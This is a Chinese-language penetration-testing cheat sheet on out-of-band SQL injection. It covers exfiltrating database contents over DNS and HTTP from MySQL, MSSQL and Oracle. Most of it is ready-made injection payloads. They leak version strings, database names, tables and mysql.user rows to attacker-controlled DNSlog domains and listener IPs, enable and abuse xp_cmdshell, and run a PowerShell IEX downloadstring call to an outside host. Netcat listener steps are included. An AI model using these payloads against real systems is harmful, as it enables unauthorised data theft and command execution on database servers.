# 0x00 数据外带平台

| 平台网址          | 平台简介                                       |
| :---------------- | :--------------------------------------------- |
| http://dnslog.cn/ | 仅支持DNS数据外带                              |
| http://ceye.io/   | 支持DNS和HTTP两种数据外带方式（**推荐使用** ） |

# 0x01 DNS外带

## MYSQL 数据外带

> **外带原理**

- 利用UNC路径去访问服务器，dns会有日志，通过子查询，将内容拼接到域名内，利用MYSQL内置函数load_file()去访问共享文件，访问的域名被记录,此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询，拼接到域名中，访问时将访问服务器，记录后查看日志。

注：load_file函数在Linux下是无法用来做dnslog攻击的，涉及到Windows中的UNC路径。(linux中不存在UNC路径)

> **相关解释**

- UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。
- 利用内置函数load_file()来完成DNSLOG。
- load_file() 不仅能够加载本地文件，同时也能对诸如[www.test.com](http://www.test.com/)这样的URL发起请求。
- load_file() 加载文件' '，是对' \ '的转义，load_file读取文件和windows读取文件调用的都是c的fopen()函数，而双斜杠表示网络资源路径，即UNC路径，于是发起了dns请求

> **MYSQL dnslog条件**

- secure_file_priv **拥有读写权限**

```sql
secure_file_priv = ""       # 可以读取磁盘目录
secure_file_priv = "D:\"    # 可以读取D盘文件
secure_file_priv = null     # load_file限制，不能加载文件
```

- 在mysql 5.5.34 默认为空可以加载文件，之后的版本为NULL，不能加载文件

```
show global variables like 'secure%';  //查看是否有写限制
```

> **常用payload**

- 查看版本号

```
 ?id=1 union select 1,load_file(concat('\\\\',( select version()),'.2hlktd.dnslog.cn\\a')),3--+
```

- 查库名

```
?id=1 union select 1,load_file(concat('\\\\',( select database()),'.2hlktd.dnslog.cn\\a')),3--+
```

- 查表名

```
select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='mysql' limit 0,1),'.2hlktd.dnslog.cn\\a'))--+
```

- 查列名

```
select load_file(concat('\\\\',( select column_name from information_schema.columns where table_schema = 'mysql' and table_name = 'users' limit 0,1),'.2hlktd.dnslog.cn\\a'))--+
```

- 查数据

```
select load_file(concat('\\\\',( select id from mysql.user limit 0,1),'.2hlktd.dnslog.cn\\a'))--+
```

> **注意事项**

- 有些时候数据库字段的值可能是有特殊符号的，由于域名有一定规范，有些特殊符号是不能带入，这些特殊符号拼接在域名里是无法做dns查询的。可以用**hex编码** 将含特殊符号的数据外带出
- **char(ascii(database()))** 编码绕过

## MSSQL 数据外带

> **外带原理**

- 利用MSSQL中的xp_cmdshell存储过程执行ping命令或直接拼接DNS平台域名，发出DNS请求，再通过DNS平台查询DNS记录获取查询的数据

> **MSSQL dnslog条件**

- 开启xp_cmdshell功能

```
?id=1; EXEC sp_configure 'show advanced options',1;-- 
?id=1; RECONFIGURE;-- 
?id=1; EXEC sp_configure 'xp_cmdshell',1;-- 
?id=1; RECONFIGURE;-- 
```

- 验证xp_cmdshell功能

```sql
?id=1'; exec master..xp_cmdshell 'ping -n 10 127.0.0.1'-- 
```

> **常用payload**

- 查库名

```
?id=1;DECLARE @a varchar(1024);set @a=db_name();exec('master..xp_cmdshell "ping -n 2 ' %2b @a  %2b'.2hlktd.dnslog.cn"')-- 
?id=2;declare @a varchar(1024);set @a=db_name();exec('master..xp_subdirs "//'%2B@a%2B'.leitu0.log.saltor.icu\\a" ');     
注：其他方式xp_subdirs xp_dirtree xp_fileexist   
```

## Oracle 数据外带

> **外带原理**

- Oracle的带外注入和 DNSLOG很相似，需要**使用网络请求的函数** 进行注入利用

> **相关函数**

- **utl_inaddr.get_host_address()** 函数
- **SYS.DBMS_LDAP.INIT()** 函数

> **常用payload**

- 查当前用户名

```
and (select utl_inaddr.get_host_address((select user from dual)||'.aaa.com(自己搭建dnslog)') from dual)is not null --
and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.aaaa.com(自己搭建dnslog)') from dual)is not null --
```

注意：|| 转码%7C%7C

## 命令外带

- Windows系统查看当前账户名

```
ping %USERNAME%.bbn3un.ceye.io
```

# 0x02 HTTP外带

## MSSQL 数据外带

> **外带原理**

- 利用MSSQL中的xp_cmdshell存储过程 和powershell发出HTTP请求，再通过监听IP:端口 记录或外带平台查看返回数据

> **MSSQL HTTP外带条件**

- 开启xp_cmdshell功能

```
?id=1; EXEC sp_configure 'show advanced options',1;-- 
?id=1; RECONFIGURE;-- 
?id=1; EXEC sp_configure 'xp_cmdshell',1;-- 
?id=1; RECONFIGURE;-- 
```

- 验证xp_cmdshell功能

```
?id=1'; exec master..xp_cmdshell 'ping -n 10 127.0.0.1'-- 
```

> **常用payload**

- 查库名和版本

```
?id=1'; DECLARE @a varchar(8000);SET @a=db_name();exec('master..xp_cmdshell "powershell IEX (new-object net.webclient).downloadstring(''http://172.16.12.172:8888?data='%2b @a %2b''')"' ) --
?id=1'; DECLARE @okma VARCHAR(8000);SET @okma=(SELECT TOP 1 substring(@@version,1,35));exec('master..xp_cmdshell "powershell IEX (new-object net.webclient).downloadstring(''http://172.16.12.172:7777/?data='%2b @okma %2b''')"' ) --
```

## Oracle 数据外带

> **外带原理**

- 利用内置函数**utl_http.request()** 发起HTTP请求，然后通过监听IP:端口 记录或外带平台查看返回数据

> **相关函数**

- **utl_http.request()**函数**
  - **函数说明** ：在Oracle中提供了utlhttprequest函数,用于取得web服务器的请求信息,因此,攻击者可以自己监听端口,然后通过这个函数用请求将需要的数据发送反弹回头
  - **UTL_HTTP包介绍** ：提供了对HTTP的一些操作。
  - **举例** ：执行这条SQL语句，将返回 baidu. com的HTML源码

```
select UTL_HTTP.REQUEST('[http://www.baidu.com'](http://www.baidu.com))from dual
```

> **带外注入过程**

1. 判断 UTL_HTTP存储过程是否可用

- 在注入点提交如下查询:

```
select count(*) from allobjects where object name='UTL_HTTP'
```

- 通过页面回显判断UTL_HTTP是否可用,如果页面返回正常,则说明UTL_HTTP存储过程可用

1. 使用NC监听数据

- 在本地用nc监听一个端口，要求本地主机拥有一个外网的ip地址
- nc-lvvp监听端口

1. 反弹数据信息

- 在注入点提交：



```
and UTL_HTTP.request('[http://ip](http://ip):监听端口/'||(查询语句)=1--
```

- 即可实现注入攻击

注意：每次在注入点提交一次请求，nc监听完后就会断开，需要重新启动nc监听

> **常用payload**

- 判断utl_http是否可用



```
id=1 and exists (select count(*) from all_objects where object_name='UTL_HTTP')--
id=1 and (select count(*) from all_objects where object_name='UTL_HTTP')>1--
id=1 union select 1,null,3,(select count(*) from all_objects where object_name='UTL_HTTP') from dual-- 
```

- 查询数据库版本指纹



```
and utl_http.request('http://172.16.12.172:8888/'%7C%7C'~'%7C%7C(select banner from sys.v_$version where rownum=1))=1--
```

- 查当前用户名



```
id=1 and UTL_HTTP.request('http://ip:监听端口/'||(select user from dual)=1--
id=1 and utl_http.request('http://域名或者ip:端口/'||(注入的语句))=1 --  //注意||转码%7C%7C
```

> **注意：|| 转码%7C%7C**